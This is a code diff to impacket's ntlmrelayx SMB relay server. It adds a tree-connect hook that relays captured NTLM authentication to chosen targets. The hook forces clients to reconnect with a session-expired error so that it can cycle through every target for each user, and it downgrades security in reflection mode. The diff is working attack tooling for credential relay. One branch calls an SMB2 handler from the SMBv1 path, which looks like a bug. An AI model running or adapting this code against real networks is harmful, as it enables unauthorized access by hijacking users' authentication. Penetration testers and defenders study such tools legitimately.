@@ -27,6 +27,7 @@ import calendar
 import random
 import string
 import socket
+import ntpath
 
 from binascii import hexlify
 from six import b
@@ -37,9 +38,7 @@ from impacket.smbserver import SMBSERVER, outputToJohnFormat, writeJohnOutputToF
 from impacket.spnego import ASN1_AID, MechTypes, ASN1_SUPPORTED_MECH
 from impacket.examples.ntlmrelayx.servers.socksserver import activeConnections
 from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
-from impacket.smbserver import getFileTime
-from impacket.dcerpc.v5 import transport, scmr
-from impacket.dcerpc.v5.rpcrt import DCERPCException
+from impacket.smbserver import getFileTime, decodeSMBString, encodeSMBString
 
 class SMBRelayServer(Thread):
     def __init__(self,config):
@@ -97,6 +96,7 @@ class SMBRelayServer(Thread):
 
         self.origSmbComNegotiate = self.server.hookSmbCommand(smb.SMB.SMB_COM_NEGOTIATE, self.SmbComNegotiate)
         self.origSmbSessionSetupAndX = self.server.hookSmbCommand(smb.SMB.SMB_COM_SESSION_SETUP_ANDX, self.SmbSessionSetupAndX)
+        self.origsmbComTreeConnectAndX = self.server.hookSmbCommand(smb.SMB.SMB_COM_TREE_CONNECT_ANDX, self.smbComTreeConnectAndX)
 
         self.origSmbNegotiate = self.server.hookSmb2Command(smb3.SMB2_NEGOTIATE, self.SmbNegotiate)
         self.origSmbSessionSetup = self.server.hookSmb2Command(smb3.SMB2_SESSION_SETUP, self.SmbSessionSetup)
@@ -432,37 +432,11 @@ class SMBRelayServer(Thread):
     ### SMBv1 Part #################################################################
     def SmbComNegotiate(self, connId, smbServer, SMBCommand, recvPacket):
         connData = smbServer.getConnectionData(connId, checkStatus = False)
-        if self.config.mode.upper() == 'REFLECTION':
-            self.targetprocessor = TargetsProcessor(singleTarget='SMB://%s:445/' % connData['ClientIP'])
-
-        #TODO: Check if a cache is better because there is no way to know which target was selected for this victim
-        # except for relying on the targetprocessor selecting the same target unless a relay was already done
-        self.target = self.targetprocessor.getTarget()
-
-        LOG.info("SMBD-%s: Received connection from %s, attacking target %s://%s" % (connId, connData['ClientIP'],
-                                                                                     self.target.scheme, self.target.netloc))
-
-        try:
-            if recvPacket['Flags2'] & smb.SMB.FLAGS2_EXTENDED_SECURITY == 0:
-                extSec = False
-            else:
-                if self.config.mode.upper() == 'REFLECTION':
-                    # Force standard security when doing reflection
-                    LOG.debug("Downgrading to standard security")
-                    extSec = False
-                    recvPacket['Flags2'] += (~smb.SMB.FLAGS2_EXTENDED_SECURITY)
-                else:
-                    extSec = True
-
-            #Init the correct client for our target
-            client = self.init_client(extSec)
-        except Exception as e:
-            LOG.error("Connection against target %s://%s FAILED: %s" % (self.target.scheme, self.target.netloc, str(e)))
-            self.targetprocessor.logTarget(self.target)
-        else:
-            connData['SMBClient'] = client
-            connData['EncryptionKey'] = client.getStandardSecurityChallenge()
-            smbServer.setConnectionData(connId, connData)
+        if (recvPacket['Flags2'] & smb.SMB.FLAGS2_EXTENDED_SECURITY) != 0:
+            if self.config.mode.upper() == 'REFLECTION':
+                # Force standard security when doing reflection
+                LOG.debug("Downgrading to standard security")
+                recvPacket['Flags2'] += (~smb.SMB.FLAGS2_EXTENDED_SECURITY)
 
         return self.origSmbComNegotiate(connId, smbServer, SMBCommand, recvPacket)
         #############################################################
@@ -470,6 +444,13 @@ class SMBRelayServer(Thread):
     def SmbSessionSetupAndX(self, connId, smbServer, SMBCommand, recvPacket):
 
         connData = smbServer.getConnectionData(connId, checkStatus = False)
+
+        #############################################################
+        # SMBRelay
+        # Are we ready to relay or should we just do local auth?
+        if 'relayToHost' not in connData:
+            # Just call the original SessionSetup
+            return self.origSmbSessionSetupAndX(connId, smbServer, SMBCommand, recvPacket)
 
         respSMBCommand = smb.SMBCommand(smb.SMB.SMB_COM_SESSION_SETUP_ANDX)
 
@@ -483,7 +464,8 @@ class SMBRelayServer(Thread):
             sessionSetupData.fromString(SMBCommand['Data'])
             connData['Capabilities'] = sessionSetupParameters['Capabilities']
 
-            if struct.unpack('B',sessionSetupData['SecurityBlob'][0:1])[0] != ASN1_AID:
+            rawNTLM = False
+            if struct.unpack('B',sessionSetupData['SecurityBlob'][0])[0] != ASN1_AID:
                # If there no GSSAPI ID, it must be an AUTH packet
                blob = SPNEGO_NegTokenResp(sessionSetupData['SecurityBlob'])
                token = blob['ResponseToken']
@@ -679,6 +661,109 @@ class SMBRelayServer(Thread):
         smbServer.setConnectionData(connId, connData)
 
         return [respSMBCommand], None, errorCode
+
+    def smbComTreeConnectAndX(self, connId, smbServer, SMBCommand, recvPacket):
+        connData = smbServer.getConnectionData(connId)
+
+        authenticateMessage = connData['AUTHENTICATE_MESSAGE']
+        self.authUser = ('%s/%s' % (authenticateMessage['domain_name'].decode ('utf-16le'),
+                                    authenticateMessage['user_name'].decode ('utf-16le'))).upper ()
+
+        # Uncommenting this will stop at the first connection relayed and won't relaying until all targets
+        # are processed. There might be a use case for this
+        #if 'relayToHost' in connData:
+        #    # Connection already relayed, let's just answer the request (that will return object not found)
+        #    return self.smbComTreeConnectAndX(connId, smbServer, SMBCommand, recvPacket)
+
+        try:
+            if self.config.mode.upper () == 'REFLECTION':
+                self.targetprocessor = TargetsProcessor (singleTarget='SMB://%s:445/' % connData['ClientIP'])
+
+            self.target = self.targetprocessor.getTarget(identity = self.authUser)
+            if self.target is None:
+                # No more targets to process, just let the victim to fail later
+                LOG.info('SMBD-%s: Connection from %s@%s controlled, but there are no more targets left!' %
+                         (connId, self.authUser, connData['ClientIP']))
+                return self.origsmb2TreeConnect (connId, smbServer, recvPacket)
+
+            LOG.info('SMBD-%s: Connection from %s@%s controlled, attacking target %s://%s' % ( connId, self.authUser,
+                                                        connData['ClientIP'], self.target.scheme, self.target.netloc))
+
+            if self.config.mode.upper() == 'REFLECTION':
+                # Force standard security when doing reflection
+                LOG.debug("Downgrading to standard security")
+                extSec = False
+                recvPacket['Flags2'] += (~smb.SMB.FLAGS2_EXTENDED_SECURITY)
+            else:
+                extSec = True
+            # Init the correct client for our target
+            client = self.init_client(extSec)
+        except Exception, e:
+            LOG.error("Connection against target %s://%s FAILED: %s" % (self.target.scheme, self.target.netloc, str(e)))
+            self.targetprocessor.logTarget(self.target)
+        else:
+            connData['relayToHost'] = True
+            connData['Authenticated'] = False
+            del (connData['NEGOTIATE_MESSAGE'])
+            del (connData['CHALLENGE_MESSAGE'])
+            del (connData['AUTHENTICATE_MESSAGE'])
+            connData['SMBClient'] = client
+            connData['EncryptionKey'] = client.getStandardSecurityChallenge()
+            smbServer.setConnectionData(connId, connData)
+
+        resp = smb.NewSMBPacket()
+        resp['Flags1'] = smb.SMB.FLAGS1_REPLY
+        resp['Flags2'] = smb.SMB.FLAGS2_EXTENDED_SECURITY | smb.SMB.FLAGS2_NT_STATUS | smb.SMB.FLAGS2_LONG_NAMES | \
+                         recvPacket['Flags2'] & smb.SMB.FLAGS2_UNICODE
+
+        resp['Tid'] = recvPacket['Tid']
+        resp['Mid'] = recvPacket['Mid']
+        resp['Pid'] = connData['Pid']
+
+        respSMBCommand        = smb.SMBCommand(smb.SMB.SMB_COM_TREE_CONNECT_ANDX)
+        respParameters        = smb.SMBTreeConnectAndXResponse_Parameters()
+        respData              = smb.SMBTreeConnectAndXResponse_Data()
+
+        treeConnectAndXParameters = smb.SMBTreeConnectAndX_Parameters(SMBCommand['Parameters'])
+
+        if treeConnectAndXParameters['Flags'] & 0x8:
+            respParameters        = smb.SMBTreeConnectAndXExtendedResponse_Parameters()
+
+        treeConnectAndXData                    = smb.SMBTreeConnectAndX_Data( flags = recvPacket['Flags2'] )
+        treeConnectAndXData['_PasswordLength'] = treeConnectAndXParameters['PasswordLength']
+        treeConnectAndXData.fromString(SMBCommand['Data'])
+
+        ## Process here the request, does the share exist?
+        UNCOrShare = decodeSMBString(recvPacket['Flags2'], treeConnectAndXData['Path'])
+
+        # Is this a UNC?
+        if ntpath.ismount(UNCOrShare):
+            path = UNCOrShare.split('\\')[3]
+        else:
+            path = ntpath.basename(UNCOrShare)
+
+        # This is the key, force the client to reconnect.
+        # It will loop until all targets are processed for this user
+        errorCode = STATUS_NETWORK_SESSION_EXPIRED
+        resp['ErrorCode'] = errorCode >> 16
+        resp['_reserved'] = 03
+        resp['ErrorClass'] = errorCode & 0xff
+
+        if path == 'IPC$':
+            respData['Service']               = 'IPC'
+        else:
+            respData['Service']               = path
+        respData['PadLen']                = 0
+        respData['NativeFileSystem']      = encodeSMBString(recvPacket['Flags2'], 'NTFS' )
+
+        respSMBCommand['Parameters']             = respParameters
+        respSMBCommand['Data']                   = respData
+
+        resp['Uid'] = connData['Uid']
+        resp.addCommand(respSMBCommand)
+        smbServer.setConnectionData(connId, connData)
+
+        return None, [resp], errorCode
     ################################################################################
 
     #Initialize the correct client for the relay target
